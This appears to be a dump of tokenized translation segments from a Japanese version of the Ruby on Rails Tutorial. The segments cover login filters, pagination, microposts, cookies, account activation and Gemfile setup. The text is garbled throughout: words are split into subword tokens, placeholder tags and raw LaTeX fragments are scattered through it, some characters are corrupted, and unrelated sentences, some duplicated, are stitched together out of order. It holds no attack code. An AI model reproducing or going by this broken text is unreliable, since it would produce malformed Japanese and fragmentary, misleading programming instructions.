▁ テストにパス する 必要 のある 、 リスト { p 0} の {2} update {/2} アクション は 、 リスト \ ref { code : login _ up on _ signup } に示したように 、 {2} create {/2} アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁ パスワード が 空 の ま まで も 更新 できるように する ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ このコード を追加した ことにより 、 ユーザー 編集 ページ が 動く ようになります ▁( 図 \ ref { fig : edit _ form _ working })。 すべての テストを 走 ら せ て み て 、 {2}{3}{/3}{3}{4} 成功 {/4}{/3}{3}{/3} {/2} した かどうか 確かめ て みてください 。
▁ 今回は ユーザーに ログイン を 要求 するために 、 リスト { p 0} のように {2} logged _ in _ user {/2} メソッドを 定義 して {2} before _ action ▁: logged _ in _ user {/2} という 形式 で 使い ます
▁{0} 図 9 . 7 {/0} ▁{1} 保 護 された ページ にアクセス した 直 後 の ログインフォーム {/1}
▁ 解決 策 は 簡単 で 、 ▁ { p 0} で 開発 した {2} log _ in _ as {/2} ヘルパー ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ を使う ことです 。 修正 した 結果を リスト \ ref { code : edit _ tests _ logged _ in } に示します 。
▁( リスト { p 0} の {2} setup {/2} メソッド 内で ログイン 処理 を まとめ てしまう ことも 可能です 。 しかし 、\ ref { sec : friend ly _ forwarding } で 片 方 のテスト を ログイン する \ emph { 前に } 編集 ページ にアクセス する ように 変更 したい ので 、 ここで まとめ て し ま って も 結 局 は 元に戻す こと になってしまい ます 。 )
▁ セキュリティ モデル を確認する ために before フィルター を コメントアウト する ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ before フィルター の コメントアウト を 元に戻 して 、 ▁\ passing ▁ になる かどうか 確かめ てみましょう ▁( リスト \ ref { code : un comment ed _ before _ filter })。
▁ コメントアウト して いた 箇所 を 元に戻す と 、 テストが {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} する よう になるはずです 。
▁次に 、 ▁リスト { p 0} で定義した {2} log _ in _ as {/2} メソッドを使って 、 {2} edit {/2} アクション と {2} update {/2} アクション をテストします ▁( リスト \ ref { code : edit _ update _ w r on g _ user _ tests })。
▁このとき 、 既に ログイン 済み の ユーザーを 対象 と している ため 、 ログイン ページ ではなく � ルート URL に リダイレクト している 点に注意 してください 。
▁今度は テストスイート が {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁ 転 送 先 の URL を保存する 仕組み は 、 { p 0} で ユーザーを ログイン させ たとき と同じ で 、 {2} session {/2} 変数 を使います 。
▁リスト { p 0} の {2} store _ location {/2} メソッド では 、 ▁ リクエスト が 送 られ た URL を {2} session {/2} 変数 の {2} : forwarding _ url {/2} キー に 格 納 しています 。 ただし 、 {2} GET {/2} リクエスト が 送 られ たとき だけ 格 納 する ように しておきます 。
▁ いつものように 、 以下 を実行して テストスイート が ▁ {0}{1}{/1}{1}{2} 緑色 {/2} {/1}{1}{/1}{/0} ▁( 成功 ) ▁ になる ことを確認 して から 先に 進 みましょう 。
▁これで ユーザーの インデックス は 完全に 動く ように なり 、 テスト も 全 て {0}{1}{/1}{1}{2} パス {/2} {/1}{1}{/1}{/0} する ようになります 。
▁{0} 図 9 .9{/0} ▁{1} ユーザー一覧ページ に ユーザーが 1 人 しか 表示 されていない {/1}
▁{0} 図 9 .9{/0} ▁{1} ユーザー一覧ページ に 100 人 の サンプル ユーザー が表示されている {/1}
▁{0} 図 9 . 12 {/0} ▁{1} ユーザー 一覧 の 2 ページ 目 {/1}
▁ユーザー 一覧 と ページネーション に対するテスト
▁この テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁ リファクタリング の 第 一 歩 は 、 リスト { p 0} の ユーザーの {2} li {/2} を {2} render {/2} 呼び出し に置き換え ること です ▁( リスト \ ref { code : index _ view _ first _ refactoring })。
▁これは 間 違 い なく 大きな 進 歩 です 。 しかし ここで 終 わ ら せ ず 、 さらに 改良 してみましょう 。 今度は \ ko de { render } を \ ko de {@ users } 変数 に対して \ emph { 直接 } 実行 します ▁( {2} {3} リスト 9 . 4 8 {/3} {/2} )。
▁これ に 限 らず 、 リファクタリング を行う 場合には 、 アプリケーションの コード を変更する 前 と 後 で 必ず テスト を実行し 、 いずれ も {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} になる ことを確認 するようにしてください 。
▁{0} 図 9 . 14 : {/0} ▁{1} 論理値 を と る \ ko de { admin } 属性 が追加され た User モデル {/1}
▁リスト { p 0} では 、 {2} default : ▁false {/2} という 引数 を {2} add _ column {/2} に追加 しています 。 これは 、 デフォルトで は 管理者 に \ emph { な れ ない } ということ を 示す ためです
▁これで 、 削除 に関する コード に対して 、 よく テスト でき ている 状態 に なりました 。 テストスイート を 走 ら せる と {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁Ruby ▁on ▁Rails ▁ チュートリアル
▁ The ▁\ ko de { current _ user ?}
▁また 、 各 リンクを \ text tt { if } 文 で 囲 い 、 { 1 / } 管理者 に だけ 削除リンク が表示される ようにしています 。
▁{0} 図 11 . 1 {/0} ▁{1} Micropost データモデル {/1}
▁{0} 図 11 .2{/0} ▁{1} Micropost と その User は \ ko de { belongs _ to } ▁( 1 対 1 ) ▁ の関係 性 がある {/1}
▁{0} 図 11 . 3 {/0} ▁{1} User と その Micropost は \ ko de { has _ many } ▁( 1 対 多 ) ▁ の関係 性 がある {/1}
▁{0} 表 11 . 1 {/0} ▁{1} user / micropost 関連 メソッドの まとめ {/1}
▁ 正しく 関連付け が できた ら 、 リスト { p 0} の {2} setup {/2} メソッドを 修正 して 、 慣習 的に 正しく マイクロポスト を作成 してみます ▁( リスト \ ref { code : micropost _ valid ity _ test _ id io ma tic })。
▁リスト \ ref { code : micropost _ dependency } のコード が正しく 動 い ていれば 、 テストが {2}{3}{/3}{3}{4} 成功 {/4}{/3}{3}{/3} する ようになります 。 {/2}
▁{0} 図 1 � 1 . 4 {/0} ▁{1} マイクロポスト が表示され た プロフィール ページのモックアップ {/1}
▁( このとき 、 リスト { p 0} と同様に {2} if ▁@ user . microposts . any ? {/2} を使って 、 ユーザーの マイクロポスト が 1 つ も ない場合 には 空 の リスト を 表示 させ ていない 点 にも 注目してください 。 )
▁{0} 図 11 . 5 {/0} ▁{1} マイクロポスト 用の コード のある ユーザー プロフィール ページ ▁( ただし マイクロポスト がない ) {/1}
▁{0} 図 11 . 6 {/0} ▁{1} ユーザー プロフィール と スタイル の ない マイクロポスト {/1}
▁ 各 マイクロポストの 表示 には 、 3 つの どの 場合に も 、 それ が作成され て から の 時間 ▁( " 1 分 ​ ​ 前に 投 稿 " ▁ など ) ▁ が表示され ていることに注目してください 。 これはリスト { p 0} の {2} time _ ago _ in _ word s {/2} メソッド による ものです 。
▁( Application ヘルパー を インクルード することで 、 リスト { p 0} の {2} full _ title {/2} ヘルパー が 利用 でき て いる点に注目してください { p 3 })。
▁ も し \ ko de { full _ title } ヘルパー を使って 他の テスト も リファクタリング した く な った ら ▁( 例 えば リスト \ ref { code : base _ title _ test } など ) 、\ ko de { test _ helper . rb } から Application ヘルパー を インクルード してください 。
▁A ▁test ▁for ▁the ▁ user ▁ profile . ▁ {2}{3}{/3}{3}{4} g re en {/4}{/3}{3}{/3} {/2}
▁もちろん 、 シ ン プ ル になった ということ は 完成 度 が \ emph { さらに } 高 ま った ということ の 証 し であり 、 退 化 した わけではありません 。 {1}{2} 第 2 章 {/2}{/1} で scaffold に 頼 り き り だ った 頃 から ここに 至 る まで は 長 い 道 の り で した が 、 今 では scaffold が 生成 する ような 複雑な コードは ほとんど 不 要 に なりました 。
▁{0} 表 11 .2{/0} ▁{1} Microposts リソース が提供する リスト \ ref { code : microposts _ resource } の RESTful ルート {/1}
▁{0} 図 11 . 10 {/0} ▁{1} マイクロポスト 作成 フォーム のある ホ ー ム 画面 のモックアップ {/1}
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁しかし 、 今回の ように ▁“ 1 ▁ microposts ” ▁ と 表示 してしまう と 英語 の 文法 上 誤 り になってしまい ます 。 そこで 、 { p 0} で紹介した {2} pluralize {/2} メソッドを使って ▁“ 1 ▁ micropost ” ▁ や ▁“ 2 ▁ microposts ” ▁ と 表示する ように 調 整 しています 。
▁{0} 図 11 . 11 {/0} ▁{1} 新しいマイクロポスト フォーム のある Home ページ ▁ {/1}
▁{0} 図 11 . 12 {/0} ▁{1} エラーが表示され た Home ページ {/1}
▁ 図 { p 0} のモックアップ で示した ような 、 ユーザー 自身 の ポ スト を含む マイクロポストの {2} フィード {/2} がない と 不 便 です
▁{0} 図 11 . 1 3 {/0} ▁{1} 試 作 フィード がある Home ページのモックアップ {/1}
▁上のコード を使用 せずに あえて リスト \ ref { code : proto _ status _ feed } の コードを 利用 した のは 、 {2} {1} 第 12 章 {/1} {/2} で 必要となる 完全な ステータスフィード で 応 用 が 効 く ためです 。
▁{0} 図 11 . 14 {/0} ▁{1} 試 作 フィード のある Home ページ {/1}
▁{0} 図 11 . 15 {/0} ▁{1} 新しいマイクロポスト を 作成した 直 後 の Home ページ {/1}
▁{0} 図 11 . 16 {/0} ▁{1} マイクロポストの 削除リンク と 試 作 フィード のモックアップ {/1}
▁このとき 、 ▁リスト { p 0} の {2} destroy {/2} メソッド では リダイレクト を使って いる点に注目してください 。
▁{0} 図 11 . 17 {/0} ▁{1} 2 番 目 に 新しいマイクロポスト を削除し た 後 のユーザー Home ページ {/1}
▁ 既に アプリケーション 側 のコードは 実装 して あるので 、 この テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁ システム によって は 、 ここで 一 旦 Rails サーバーを再起動 させる 必要があります 。 再 起動 させ たら テストスイート を 走 ら せ て みてください 。 {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} している はずです 。
▁このとき accept パラメータ では 、 リスト { p 0} で 許可 した ファイル 形式 を 、 {2} M I M E タイプ {/2} で 指定 する ようにします 。
▁( 訳 注 : ▁この 項 は スキップ できます 。 も し うまく い か なければ スキップ しても 大 丈 夫 です ) ▁\ ref { sec : image _ re s i z ing } で 実装 した 画像 アップ ロー ダ ー は 、 開発環境 で 動か す 分 には 問題 ない のですが 、 本番環境 には 適 していません 。 これはリスト { p 2 } の {3} st or age ▁: file {/3} という 行 によって 、 ローカル の ファイル システム に 画像 を保存する よう になっている からです { p 4 } ▁( 訳 注 : ▁ただし Heroku の ファイル システム は 一時 的に しか 使 え 無 い ので 、 本番 にデプロイする たびに 画像 が 消 え ます )。
▁ 本番環境で クラウド スト レ ー ジ に保存 するために は 、 リスト { p 0} のように {2} f o g {/2} ▁gem を使うと 簡単 です 。
▁ The ▁\ ko de { current _ user ?}
▁ error
▁これは 以下 で使用する 最初の アプリケーション です 。
▁[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// railstutorial . j p / )
▁ ちなみに 、 ここに flash のテスト も 追加 しておく と よいでしょう 。 これは 演習 として 残 しておきます ▁(\ ref { sec : exercises _ the _ flash })。
▁ 新しい パスワードを 再 設定 するための フォーム ▁( 図 \ ref { fig : forgot _ password _ form _ mockup }) ▁ と 、 User モデル 内の パスワード を変更 するための フォーム ▁( 図 \ ref { fig : reset _ password _ form _ mockup }) ▁ が 両方 必要 になる ので 、 今回は \ ko de { new }、\ ko de { create }、\ ko de { edit }、\ ko de { update } の ルーティング も 必要 になります 。
▁ 本チュートリアル を 進め ていれば 、 どう や って も 手順 に 書い て ある とおり に 動か ないこと がある でしょう 。
▁ ハ マ り やすい 手順 については できる だけ 情報を 補 う ようにしています が 、 すべての 場合 を カ バー する のは 不 可能です 。
▁ そう した ト ラ ブ ル は む し ろ 技術 の 理解 を 深 め る 絶 好 の チ ャ ン ス と 捉 え 、 頑 張 って 解決 してみましょう 。
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option _ redux } の 演習 の リスト \ ref { sec : signup _ exercises } の 結果を 利用 しています 。 これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁ n t ▁ pre r equ i site s ▁( e special ly ▁\ l er , ▁\ le s , ▁and ▁\ l er a ). < n >< n > ▁\ section { ユーザー を表示する } ▁% ▁( fold )< n > ▁\ label { sec : show ing _ users }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁ rails _ environments ▁( end )< n >< n > ▁\ subsection { Users リソース } ▁% ▁( fold )< n > ▁\ label { sec : a _ users _ resource }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁a _ users _ resource ▁( end )< n >< n >\ subsection { デ バ ッ ガ ー } ▁% ▁( fold )< n >\ label { sec : debug g er }< n >< n >
▁ b section ▁ debug g er ▁( end )< n >< n > ▁\ subsection { Gravatar 画像 と サイドバー } ▁% ▁( fold )< n > ▁\ label { sec : a _ gravatar _ image }< n >< n >
▁ i ce ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 b b f e ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ us ing _ form _ for ▁( end )< n >< n > ▁\ subsection { フォーム HTML } ▁% ▁( fold )< n > ▁\ label { sec : the _ form _ html }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁the _ form _ html ▁( end )< n >< n > ▁\ section { ユーザー登録 失敗 } ▁% ▁( fold )< n > ▁\ label { sec : unsuccessful _ signup s }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁the _ f in i sh ed _ signup _ form ▁( end )< n >< n > ▁\ subsection { flash } ▁% ▁( fold )< n > ▁\ label { sec : the _ flash }< n >< n >
▁< n >< n > ▁% ▁subsection ▁the _ first _ signup ▁( end )< n >< n >\ subsection { 成功 時の テスト } ▁% ▁( fold )< n >\ label { sec : a _ test _ for _ valid _ submission }< n >< n >
▁ コミット ▁( commit )
▁ ActionView :: M is s ing T e m p la te :
▁ モデルの 継 承 関係 と同様に 、 Users コントローラ も Microposts コントローラ も 最終的に は \ ko de { ActionController :: Base } を継承し ており 、 モデル オブジェクトの 操作 、 イン バ ウ ンド HTTP ▁ request の フィルタ 、 ビュー を HTML として 出力 する などの 多 彩 な 機能を 実行 できる ようになっています 。 ▁S in ce ▁ all ▁Rails ▁ controllers ▁in her it ▁ from ▁{1} Application Controller {/1} , ▁ r ul es ▁def in ed ▁in ▁the ▁ Application ▁ controller ▁ auto ma tic all y ▁app ly ▁to ▁ e ver y ▁ action ▁in ▁the ▁ application .
▁ 結果 は 図 \ ref { fig : sqlite _ database _ browser } の よう になる ので 、 図 \ ref { fig : user _ model _ initial } と 比 べ て みてください 。
▁この こと から 、 複数の アサーション を 1 つの テスト に まとめ るように して 、 ( mini test を通して ) ▁Ruby に どの セ リ フ で 間 違 った のか を 話 させる ようにしています 。
▁ 「 Ctrl - C 」 と同様に 「 Ctrl - D 」 と 表 記 する 慣習 になっています が 、 ▁ 実際に 押 す のは 小文字 の d なので 、 シ フ ト キー を 押 し 続 け る 必要はありません 。
▁\ ko de { new } アクション を生成する と 、 それ に対応する \ emph { ビュー } も 生成されます 。 \ ko de { create } や \ ko de { destroy } には 対応する ビュー がない ▁( = 不 要 ) ▁ なので 、 無 駄 な ビュー を作成し ない ために ここでは new だけ を指定して います 。
▁ これはリスト \ ref { code : log _ out _ with _ for get } で使用されていま した 。
▁2 番目の 地 味 な 問題 は 、 ユーザーが 複数の ブラウザ ▁( C h r o me や Firefox など ) ▁ で ログイン して いた ときに 生 じ ます 。 具体的には 、 一方 の ブラウザで は ログアウト し 、 もう 一方 の ブラウザで は ログアウト せずに 、 一度 ブラウザ を 終 了 させ 、 再度 同じ ページ を開く と 、 この問題 が発生し ます
▁ 一方 、 C h r o me を 閉 じ たとき 、\ ko de { session [: user _ id ]} は \ ko de { nil } になります ▁( これは ブラウザ が 閉 じ たとき に 、 全 て の セッション 変数 の 有効 期 限 が 切 れる ためです )。 しかし 、\ ko de { cookies } は ブラウザ の中に 残 り 続けて い るため 、 データベースから その ユーザー を見つけ ること が できてしまいます 。
▁Rails を 「 デフォルト ス タ ッ ク 」 の ま ま 無 改 造 で 使う ことに しました 。 これ に 伴 い 、 テスティング フレームワーク も 従来 使用 して いた RSpec から 、 標準 の mini test に 切り 替 え ました 。
▁ 本チュートリアルで 学ぶ う え で 必要となる 前 提 知 識 は 、「 公式 には 」 ありません 。 \ emph { Rails チュートリアル } には 必要な 要素 が すべて 盛 り 込 まれ ています 。 中 心 となる のは もちろん Rails ですが 、 他にも Ruby 言語 や mini test ▁( Rails の テスティング フレームワーク ) ▁ 、\ href { http :// en . w ikipedia . org / wiki / HTML } { HTML }、\ href { http :// en . w ikipedia . org / wiki / CSS } { CSS } 、 若 干 の \ href { http :// en . w ikipedia . org / wiki / JavaScript } { JavaScript } と \ href { http :// en . w ikipedia . org / wiki / SQL } { SQL } の チュートリアル もあります 。
▁\ ko de { new } アクション を生成する と 、 それ に対応する \ emph { ビュー } も 生成されます 。 \ ko de { create } や \ ko de { destroy } には 対応する ビュー がない ▁( = 不 要 ) ▁ なので 、 無 駄 な ビュー を作成し ない ために ここでは new だけ を指定して います 。
▁リスト \ ref { code : rails _ command } の コマンド では 、 Rails のバージョン を ( \ ko de { _ 4 . 2 . 0 _ }) と 明示的に 指定 している 点 にご注目ください 。
▁ 実際には 「 Ctrl キー を 押 し ながら c キー を 押 す 」 ことを 意味 します 。 このとき 、 大文字 の C に するために S h if t キー も 一 緒 に 押 す 必要はありません 。 表 記 上の 習慣 により 大文字 で 「 Ctrl + C 」 と 書かれてい る に 過 ぎ ません 。
▁ Git ▁( という より バージョン管理 ) ▁ は それ だけで 大きな テ ー マ なので 、 すべて を 説明 し よう と すると 軽 く 一 冊 の 本 を 超 え てしまいます 。 本チュートリアルで は 簡単に 言 及 する に と ど め ます が 、 幸 い ネ ッ ト 上 には 無 償 で 利用できる リソース が あ ふ れ ています 。 その 中 でも 特に 、 ザ ッ ク リ と 知 る には 「\ href { https :// con f l u en ce . at la s s i an . com / d is p la y / B I T B U C K E T / C l one + y our + Git + re p o s it or y + and + add + source + file s } { B it B u c ke t ▁10 1 } ▁( 英語 のみ )」 を 、 じ っ く り と 学ぶ には 「\ href { http :// git - sc m . com / book }{\ emph { Pro ▁ Git } } ▁( 日 本 語 � あり )」 S co tt ▁C ha con ▁( A pre s s , ▁ 200 9 ) ▁ を お勧め いた します 。
▁ これはリスト \ ref { code : remember _ me _ ter n ary } で使用されていま した 。
▁なお 、\ ko de { follower } の 関連付け については 、\ ref { sec : followers } に 入 る まで は 使い ません 。 しかし follower と followed を 対 称 的に 実装 しておくこと で 、 構造 に対する 理解 は 容易に な る はずです 。
▁リスト \ ref { code : relationships _ fixtures } の fixture では 、 前 半 の 2 つ で Michael が L an a と M all or y を フォロー し 、 後 半 の 2 つ で L an a と A r ch er が Michael を フォロー しています 。
▁self を省略した 結果を リスト \ ref { code : gitignore _ upload s } に示します 。
▁(\ emph { No te } : ▁I f ▁you ▁ com p let ed ▁the ▁ exercise ▁c or respond ing ▁to ▁ L ist ing ▁\ ref { code : base _ title _ test } , ▁you ▁ sh o ul d ▁ re t a in ▁the ▁\ ko de { setup } ▁ method ▁def in ing ▁the ▁\ ko de {@ base _ title } ▁ variable . )
▁Ruby において \ ko de { nil } は 特別な オブジェクト です 。 Ruby の オブジェクト のうち 、 オブジェクト そのもの の 論理値 が false になる のは 、 ( \ ko de { false } という オブジェクト 自身 を 除 いて ) ▁nil \ emph { だけ } です 。
▁次に 、\ ko de { data - turbolinks - t rack } における キー と 値 の ペ ア の 表 記 が 、 旧 式 の ハッシュ ロ ケ ッ ト ▁( => ) ▁ スタイル になっている 点が 不 思 議 です 。
▁self を省略した 結果を リスト \ ref { code : micropost _ order _ test } に示します 。
▁( このコード は \ emph { スコープ } に関する 最初の 例 で もあります 。
▁ これはリスト \ ref { code : micropost _ order ing } で使用されていま した 。
▁ 数 分 待 って から ページを 再度 読み込む と 、 この テキスト は自動的に 新しい 時間 に基づいて 更新 されます 。
▁ これはリスト \ ref { code : microposts _ controller _ access _ control } で使用されていま した 。
▁リスト \ ref { code : mail _ account _ activation } では 、\ ko de { mail } に \ ko de { subject } キー も 引数として 渡 しています 。 この 値 は メールの 件 名 になります 。
▁# ▁このコードは 準備 段 階 です 。 < n > ▁#
▁ 完全な 実装 は 第 11 章 「 ユーザーを フォロー する 」 を参照してください 。
▁ development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次 は { p 2 } で 自動生成 した User メイラー の {3} プレビュー ファイル {/3} の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s })。
▁ただし さ さ い な ことで は あります が 、 マイクロポストの 投 稿 が \ emph { 失敗する } と 、 ▁ Home ページ は \ ko de {@ feed _ item s } インスタンス変数 を 期 待 している ため 、 現 状 では 壊 れ てしまいます ▁( この ことは テストスイート を実行して 確認 できます )。
▁ 先ほど の 順 で 書いた 統合テスト は 、 リスト \ ref { code : micropost _ in ter fa ce _ test } のようになります 。
▁self を省略した 結果を リスト \ ref { code : g en er al ize d _ current _ user } に示します 。
▁このとき accept パラメータ では 、 リスト { p 0} で 許可 した ファイル 形式 を 、 {2} M I M E タイプ {/2} で 指定 する ようにします 。
▁作成した コードをリスト \ ref { code : new _ password _ reset } に示します
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ これはリスト \ ref { code : g en er al ize d _ authenticated _ p } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : password _ reset _ edit _ action } に示します 。
▁ これはリスト \ ref { code : sessions _ resource } で使用されていま した 。
▁ / sessions
▁ 新しい セッション を作成する
▁( 注 : ▁\ ko de { form _ for } の代わりに \ ko de { form _ tag } を使う ことも でき 、 Rails では この 方が 慣 用 的な 方法 です 。 しかし 、 ユーザー登録フォーム では form _ for を使用する 方が 一般的 であり 、 並 列 構造 を 強 調 するために も form _ for を使用し ました 。
▁ これはリスト \ ref { code : login _ form _ html } で使用されていま した 。
▁< div >
▁\ ko de { authenticate } メソッドは 認 証 に 失敗した ときに \ ko de { false } を返す ▁(\ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user }) ▁ ことを 思い 出 しましょう 。 以上 を まとめ て ユーザー ログイン を 実装 した もの を リスト \ ref { code : find _ authenticate _ user } に示します 。
▁ フラッシュメッセージ は Web サイトの レイアウト に 表示される ▁( リスト \ ref { code : layout _ flash }) ▁ ので 、\ ko de { flash [: d an g er ]} で 設定 した メッセージ は自動的に 表示 されます 。 Bootstrap ▁ CSS の おかげで 適切な スタイル も 与え られます ▁( 図 \ ref { fig : failed _ login _ flash })。
▁リスト { p 0} で {2} log _ in {/2} という ヘルパーメソッド を 定義 できた ので 、 や っ と 、 ユーザー ログイン を行って セッション の {2} create {/2} アクション を 完了 し 、 ユーザーの プロフィール ページに リダイレクト する 準備 が できました 。
▁最後に 、 以下のように プロファイル へのリンク も 追加 します 。
▁self を省略した 結果を リスト \ ref { code : layout _ login _ log out _ links } に示します 。
▁作成した コードをリスト \ ref { code : destroy _ session } に示します
▁ これはリスト \ ref { code : add _ remember _ digest _ to _ users } で使用されていま した 。
▁\ ko de { cookies . signed [: user _ id ]} では 自動的に ユーザー ID の cookies の 暗 号 が 解 除 され 、 元に戻 ります 。
▁もちろん 、 この \ ko de { cookies } は \ emph { 本 物 の } ハッシュ ではなく 、 実際には \ ko de { cookies } に 割り当て を 行った ときに ブラウザ 上の テキスト の 断 片 を \ emph { 保存 } している だけです 。 そう した アプリケーションの 実装 の詳細 を 気 に し なく て よい 点 に 、 Rails の 美 し さ の 一 端 が 垣 間 見え ます 。
▁ サンプルアプリケーションの コア 部分を 開発 するために 、 これまで に ユーザー 、 セッション 、 アカウント有効化 、 パスワード リセット という 4 つの リソース について 見 てきました 。 そして 、 これら のうち 「 ユーザー 」 という リソース だけ が 、 Active ▁Record によって データベース 上の テーブル と 紐 付 い ています 。
▁ この節 で 定義 する \ ko de { belongs _ to } / \ ko de { has _ many } 関連付け を使用することで 、 表 \ ref { table : association _ method s } に 示す ような メソッドを Rails で 使えるようになります 。
▁self を省略した 結果を リスト \ ref { code : log _ out _ with _ for get } に示します 。
▁ただし 、 残念ながら デフォルトの 順序 が \ emph { 昇 順 } と な っている ので 、 このままでは 数 の 小 さ い 値 から 大 き い 値 に ソ ート され てしまいます ▁( 最も 古 い 投 稿 が 最初に 表示 され てしまいます )。
▁上のコード の場合 、 以下 が その 関数 です 。
▁ これはリスト \ ref { code : user _ log out _ test } で使用されていま した 。
▁この 項 では 、 ユーザーの プロフィール画面 ▁(\ ko de { show . html . erb }) ▁ で その ユーザーの マイクロポストを 表示 させ 、 また 、 これまで に 投 稿 した 総 数 も 表示する ように していきます 。
▁ これを 参 考 に 、\ ko de { _ micropost . html . erb } パーシャル を使って マイクロポストの コレクション を表示し よう と すると 、 次の ようになります 。
▁self を省略した 結果を リスト \ ref { code : branch _ no _ raise } に示します 。
▁ これはリスト \ ref { code : remember _ method } で使用されていま した 。
▁\ ref { sec : remember _ me _ check box } では 、 現在の アプリケーション 設計 では 、 リスト { p 2 } の 統合テスト で 仮 想 の {3} remember _ token {/3} 属性 にアクセス する手段 がない ことを 説明 しました 。
▁このコードは リスト \ ref { code : login _ create _ user _ instance } で使用されていま した 。 もうひとつ 、
▁ before _ action はデフォルトで 両方 の アクション に適用 される ため 、 制限 を 適 用 する アクション を 明 示 していない ことに注意してください 。
▁ Users リソース の場合 と同様に 、 結合 テスト を使用します 。
▁ アカウントを有効化する 段 取り は 、 ユーザー ログイン ▁(\ ref { sec : log g ing _ in }) 、 特に ユーザーの 記 憶 ▁(\ ref { sec : remember _ me }) ▁ と似ています 。
▁self を省略した 結果を リスト \ ref { code : activation _ digest _ test } に示します 。
▁このコードは リスト \ ref { code : generated _ account _ activation _ view _ text } で使用されていま した 。 もうひとつ 、
▁ フィード ア イ テ ム パーシャル に 削除リンク を追加する 。
▁ この場合 、 ▁\ ko de { find } ではなく \ ko de { find _ by } を使用します 。 これは 、 前 者 では マイクロポスト がない 場合に 例外が発生します が 、 後 者 は \ ko de { nil } を返す ためです 。
▁ ところで 、 Ruby の 例外 処理 に 慣 れ ている 方 なら 、\ ko de { correct _ user } の フィルタ を 以下のように 書く こともできます 。
▁ re sc u e
▁\ ko de { Micropost } モデル を 以下のように 直接 使用 して \ ko de { correct _ user } フィルタ を実装する こともできます 。
▁ これはリスト \ ref { code : development _ email _ settings } で使用されていま した 。
▁まずは \ text tt { c ar ri er w a ve } ▁gem を \ ko de { Gemfile } に追加 しましょう ▁( リスト \ ref { code : gemfile _ c ar ri er w a ve })。
▁\ ko de { Gemfile } に CarrierWave を追加する
▁\ ko de { s end } メソッド の動作 原 理 が わ か った ので 、 それ に基いて \ ko de { authenticated ?} メソッドを 書き 換 え ます 。
▁ 以上 の 説明 を 実際の User モデル に適用 して できた 、 一 般 化 された \ ko de { authenticated ?} メソッドを リスト \ ref { code : g en er al ize d _ authenticated _ p } に示します 。
▁ 参 考 まで に 、 最 終 状態 の \ ko de { Gemfile } を リスト \ ref { code : f in al _ gemfile } に示します 。
▁(\ ko de { user } を \ ko de { self } に 切り 替 え る という 手 も ある のですが 、\ ko de { self } は モデル 内で は 必 須 では ない と \ ref { sec : the _ ca ve at } で 解 説 した ことを 思い 出 しましょう )。
▁ サイドバー の マイクロポスト カウント のテスト を追加し てください 。 このとき 、 表示 に 単数形 と 複数形 が正しく 表示 されている かどうか も テスト してください 。
▁ マイクロポストの ページネーション のテスト を追加し てください 。
▁ 削除リンク が 、 現在のユーザー によって 作成 されていない マイクロポスト には 表示 され ない ことを確認 するための テスト を作成 してください 。
▁ これはリスト \ ref { code : w r a p } で使用されていま した 。
▁このとき 、 出力 された HTML が Rails によって エスケープ される の を防ぐ ために \ ko de { raw } メソッドを使用して ください 。 また 、 ク ロ ス サイト ス ク リ プ テ ィ ング ▁( XSS ) ▁ を防ぐ ために \ ko de { sanitize } メソッド も 使用 してください 。
▁ これはリスト \ ref { code : password _ reset s _ resource } で使用されていま した 。
▁作成した コードをリスト \ ref { code : password _ reset _ test } に示します
▁リスト \ ref { code : password _ reset _ form } のとき
▁上のコード が 動作する には 、 この \ ko de { password _ reset _ expir ed ?} メソッド を定義する 必要があります 。
▁たとえば 「 Gemfile 」 という ファイル名 を検索する と 、\ ko de { Gemfile } と \ ko de { Gemfile . lock } を含め 、 候 補 が 6 つ も 表示 され てしまいます 。
▁ 次 は 、\ ref { sec : p la n n ing _ the _ application } と同じ ように 、 テキストエディタ を使って \ ko de { Gemfile } に 必要な gem を 書き 足 していきます 。
▁ サンプルアプリケーション 用の \ ko de { Gemfile }
▁ここで 使用する \ ko de { Gemfile } で 指定 されている の と 異なる バージョンの gem ▁( Rails 自身 の gem を含む ) ▁ を これまで に インストール して いた 場合は 、 以下のように \ ko de { bundle ▁ update } を実行して gem を \ emph { 更新 } し 、 gem のバージョン を 合わせ ておく と よいでしょう 。
▁self を省略した 結果を リスト \ ref { code : sample _ app _ read me } に示します 。
▁次に 、 拡張子 を ▁\ ko de { . m d } ▁ に変更 し 、 M ar k d own ファイル として 認 識 できるようにします 。 その後 、 これらの 変更を コミット します 。
▁{0}{1} リスト 3 . 4 {/1}{/0} を もう一度 注意 深 く 読んで み ると 、 アクション と ビュー の関係 性 について 理解 できる でしょう 。 \ ko de { home } アクション は 、\ ko de { home . html . erb } という ビュー に 対応 しています 。
▁( パス したときに も 色 を 表示 できるように するには 、\ ref { sec : mini test _ re port er s } の mini test レ ポ ー ター を オプション で 追加する必要があります )。
